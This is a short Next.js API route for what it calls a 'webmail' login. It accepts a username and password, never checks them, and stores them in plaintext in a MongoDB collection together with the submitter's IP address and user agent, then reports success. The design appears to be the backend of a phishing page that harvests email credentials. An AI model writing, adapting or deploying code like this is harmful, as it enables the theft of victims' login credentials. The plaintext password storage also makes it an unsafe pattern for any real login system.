import { NextRequest, NextResponse } from "next/server";
import clientPromise from "@/lib/db";

export async function POST(request: NextRequest) {
  try {
    const { username, password } = await request.json();

    if (!username || !password) {
      return NextResponse.json(
        { error: "Username and password are required" },
        { status: 400 },
      );
    }

    const client = await clientPromise;
    const db = client.db("webmail");
    const collection = db.collection("logins");

    await collection.insertOne({
      username,
      password,
      timestamp: new Date(),
      userAgent: request.headers.get("user-agent") || "",
      ip:
        request.headers.get("x-forwarded-for") ||
        request.headers.get("x-real-ip") ||
        "",
    });

    return NextResponse.json({ success: true });
  } catch (error) {
    console.error("Login error:", error);
    return NextResponse.json(
      { error: "Internal server error" },
      { status: 500 },
    );
  }
}
